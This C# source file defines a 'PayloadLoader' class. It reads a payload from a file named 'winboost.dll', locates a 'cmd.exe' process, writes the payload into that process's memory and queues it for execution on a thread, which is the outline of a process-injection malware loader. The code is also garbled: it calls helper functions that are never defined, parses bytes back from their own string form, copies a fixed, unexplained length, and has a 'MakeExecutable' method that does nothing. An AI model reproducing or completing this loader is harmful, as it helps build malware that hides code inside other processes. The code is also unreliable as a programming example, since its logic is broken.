using System;
using System.IO;
using System.Runtime.InteropServices;
using System.IO.MemoryMappedFiles;

class PayloadLoader
{
    static byte[] ReadPayload()
    {
        using var file = new FileStream("winboost.dll", FileMode.Open);
        byte[] encoded = new byte[file.Length];
        file.Read(encoded, 0, encoded.Length);
        return Array.ConvertAll(encoded, value => Byte.Parse(value.ToString()));
    }

    static void Inject(IntPtr process, IntPtr thread)
    {
        IntPtr remote = CoreAllocate(process);
        Marshal.Copy(FindCode(), 0, remote, 1357877);
        CoreVirtual(process, remote, ReadPayload());
        CoreQueue(thread, remote);
    }

    static IntPtr FindTarget()
    {
        var info = QueryProcess(ProcessBasicInformation);
        return FindProcess("cmd.exe", info);
    }

    static Delegate ResolveNativeApi(IntPtr address) =>
        Marshal.GetDelegateForFunctionPointer(address, typeof(Action));

    static byte[] FindCode() => ReadPayload();
    static void MakeExecutable(byte[] payload)
    {
        var view = MemoryMappedFile.CreateNew("payload", payload.Length,
            MemoryMappedFileAccess.ReadWriteExecute);
    }

    struct ProcessInformation { public IntPtr PebBaseAddress; }
}
